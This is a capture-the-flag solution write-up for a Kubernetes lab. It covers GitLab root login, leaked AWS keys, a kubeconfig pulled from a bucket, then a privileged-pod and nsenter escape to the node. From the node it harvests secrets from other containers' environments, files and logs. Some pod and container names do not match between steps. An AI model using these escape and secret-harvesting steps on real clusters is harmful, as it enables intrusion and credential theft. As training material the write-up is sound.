# Solution

## Part 1 - Pivot out of GitLab

- Access <gitlab.foobar.com>
  - Use credentials:
    - u: `root`
    - p: `Ikn0wwh@ty0ud1dl@5tKub3C0n3`
- Go to <http://gitlab.foobar.com/gitlab-instance-f01e4d8a/foobar-taxi>
  - Review README
- Go to <http://gitlab.foobar.com/gitlab-instance-f01e4d8a/foobar-taxi/-/commits/main>
  - Review the git commit messages
- Go to <http://gitlab.foobar.com/gitlab-instance-f01e4d8a/foobar-taxi/-/commit/f0e9ad8ac74a428da5c2a4835a633a7bac6b1193>
  - Review for file that has been added by mistake

## Part 1 - Flag

- FLAG(IckyThumb)

## Part 2 - Get config from Bucket

- Use `aws` to copy file the `config` file from bucket

```sh
aws configure set aws_access_key_id "uUcDGYowgomWC8Z5"
aws configure set aws_secret_access_key "FLAG(IckyThumb)"
aws configure set default.region "us-east-1"
aws configure set default.output "json"
aws --endpoint-url=http://bucket.foobar.com:4566 s3 cp s3://foobar-creds/config ./config
```

> NOTE: if <bucket.foobar.com> hasn't been added to the `/etc/hosts` file, then use this:

```sh
aws --endpoint-url=http://localhost:4566 s3 cp s3://foobar-creds/config ./config
```

- Use the config file to connect to the cluster:

```sh
kubectl --kubeconfig=config auth can-i --list
```

## Part 3 - The Homer

Check what kind of pods do we already have at "the-homer" namespace:
```bash
kubectl get pods -n the-homer
NAME             READY   STATUS    RESTARTS   AGE
homer-pod        1/1     Running   0          61m
```

Check what the "homer-pod" actually looks like, what's doing:
```bash
kubectl get pods -n the-homer homer-pod -o yaml
```

Modify the pod spec and include the "hostPID", "hostNetwork", "privileged" flags and set it to true, to be able to 
land on the node. 
```bash
apiVersion: v1
kind: Pod
metadata:
  name: homer-pod-privileged
  namespace: the-homer
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: homer-pod-privileged
    image: cgr.dev/chainguard/nginx:latest
    ports:
    - containerPort: 80
    securityContext:
      privileged: true
```

Apply it:

```bash
kubectl apply -f the-homer-priv.yaml
```

Exec into pod:

```bash
kubectl exec -it car-the-privileged-pod -- /bin/sh
root@gke-kubecon-na-ctf-1-default-pool-cfa14102-q2bp:/#
```

Enter into all the namespaces:

```bash
root@gke-kubecon-na-ctf-1-default-pool-cfa14102-q2bp:/# nsenter -t 1 -m -u -n -i -p bash
gke-kubecon-na-ctf-1-default-pool-cfa14102-q2bp / #
```

## Part 3 - Optional flag

Find the flag:

```bash
gke-kubecon-na-ctf-1-default-pool-cfa14102-q2bp / # find .  -name "*flag*" -print
./home/car_capital/f0rd_flag.png
```

The file is `./home/car_capital/f0rd_flag.png`

Get the content:

```bash
cat ./home/car_capital/f0rd_flag.png

aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xTi12Nms0YVNpNnFvMXgyY3BJS1IwbjVW
R0dXMFh4a1Qvdmlldw==
```

Decode it from base64:

```bash
base64 -d /home/car_capital/f0rd_flag.png

https://drive.google.com/file/d/1N-v6k4aSi6qo1x2cpIKR0n5VGGW0XxkT/view
```

## Part 4 - boombox

Let's check what other container we have in the node -- since we have access to all the resources.
```bash
gke-test-ctf1-default-pool-f53d5f46-193r / # crictl ps
CONTAINER           IMAGE               CREATED             STATE               NAME                        ATTEMPT             POD ID
83bed131d1aa4       76c69feac34e8       7 minutes ago       Running             homer-pod-priv              0                   f05e5ab2c0374
5cbb847dd9147       751ae29343161       About an hour ago   Running             boombox                     0                   b4c9ed42aac3d
a7c59e682abec       63c5d601075ce       About an hour ago   Running             beep-beep                   0                   88908c85a6636
7a3591a7ace99       155251590ab59       About an hour ago   Running             homer-pod                   0                   2bbd5cf5873e7
```

Let's start with boombox, inspect it:
```bash
crictl inspect 5cbb847dd9147
```

We can see that it's a service, listening on 4000:
```bash
          "key": "NAPSTER_PORT_4000_TCP_PORT",
          "value": "4000"
        },
        {
          "key": "NAPSTER_PORT_4000_TCP_ADDR",
          "value": "10.72.7.227"
        },
```

Let's just get the PID:
```bash
  "info": {
    "sandboxID": "b4c9ed42aac3dc4d402f1a8018c11a61d6677d51b8af348649c233f6c0fc9bd7",
    "pid": 6905,
```

And check what's on the service port:
```bash
watch -n 1 curl 10.72.7.227:4000
```

Go to the container directory on the host, it's under /proc/<PID>
```bash
cd /proc/6905/
```

Check the environment variables:
```bash
gke-test-ctf1-default-pool-f53d5f46-193r /proc/6905 # cat environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/ko-appHOSTNAME=boombox-85bdd7ff6f-v84zxSSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crtKO_DATA_PATH=/var/run/koKUBERNETES_PORT_443_TCP_PROTO=tcpNAPSTER_PORT_4000_TCP_PORT=4000NAPSTER_PORT_4000_TCP_ADDR=10.72.7.227NAPSTER_PORT_4000_TCP_PROTO=tcpKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_ADDR=10.72.0.1NAPSTER_SERVICE_HOST=10.72.7.227NAPSTER_PORT=tcp://10.72.7.227:4000KUBERNETES_PORT=tcp://10.72.0.1:443NAPSTER_PORT_4000_TCP=tcp://10.72.7.227:4000KUBERNETES_SERVICE_PORT=443KUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_PORT_443_TCP=tcp://10.72.0.1:443NAPSTER_SERVICE_PORT=4000KUBERNETES_SERVICE_HOST=10.72.0.1HOME=/home/nonroot
```

We can see that it's a go application built by ko, let's just go to the `/var/run/ko` directory:
```bash
gke-test-ctf1-default-pool-f53d5f46-193r /proc/6905 # cd root/var/run/ko
```

And let's see what's in there:
```bash
ls -l
total 4
drwxr-xr-x 3 root root 4096 Oct 26 13:57 his
```

Get the flag:
```bash
cat his/palms/are/sweaty/knees/weak/arms/are/heavy/theres/vomit/on/his/sweater/already/moms/spagetti
FLAG=loseyourself
```

## Part 5 - BeepBeep

Let's inspect what beepbeep is doing. Get the containerID:
```bash
crictl ps
CONTAINER           IMAGE               CREATED             STATE               NAME                        ATTEMPT             POD ID
83bed131d1aa4       76c69feac34e8       30 minutes ago      Running             homer-pod-priv              0                   f05e5ab2c0374
5cbb847dd9147       751ae29343161       About an hour ago   Running             boombox                     0                   b4c9ed42aac3d
a7c59e682abec       63c5d601075ce       About an hour ago   Running             beep-beep                   0                   88908c85a6636
```

and run:
```bash
crictl inspect a7c59e682abec
```

Check if there is any info related to logging:
```bash
      },
      "log_path": "beep-beep/0.log",
      ...
    ],
    "logPath": "/var/log/pods/intersection_beep-beep-722gl_417af059-0e56-4129-aa4c-607772f75356/beep-beep/0.log"
    ...
```

In another terminal check the logs from the container:
```bash
kubectl logs -f -n intersection beep-beep-722gl
🟢 - green
🟡 - yellow
🔴 - red
🟢 - green
🟡 - yellow
🔴 - red
🟢 - green
🟡 - yellow
```

Let's try to stop it:
```bash
gke-test-ctf1-default-pool-f53d5f46-193r ~ # crictl stop 8bc9bef03b864
8bc9bef03b864
```

Observe the flag from the logs:
```bash
🟢 - green
🟡 - yellow
Signal received: terminated
[PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/ko-app HOSTNAME=beep-beep-722gl SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt KO_DATA_PATH=/var/run/ko KUBERNETES_PORT=tcp://10.72.0.1:443 KUBERNETES_PORT_443_TCP=tcp://10.72.0.1:443 KUBERNETES_PORT_443_TCP_PROTO=tcp KUBERNETES_PORT_443_TCP_PORT=443 KUBERNETES_PORT_443_TCP_ADDR=10.72.0.1 KUBERNETES_SERVICE_HOST=10.72.0.1 KUBERNETES_SERVICE_PORT=443 KUBERNETES_SERVICE_PORT_HTTPS=443 HOME=/home/nonroot]
AWS_ACCESS_KEY_ID=SOMETHINGSOMETHING
AWS_SECRET_ACCESS_KEY=FLAG(DodgeViper)
AWS_DEFAULT_REGION=🗽 - ⬆️  ⬇️  ➡️  ⬅️  - 🍔
exiting
```

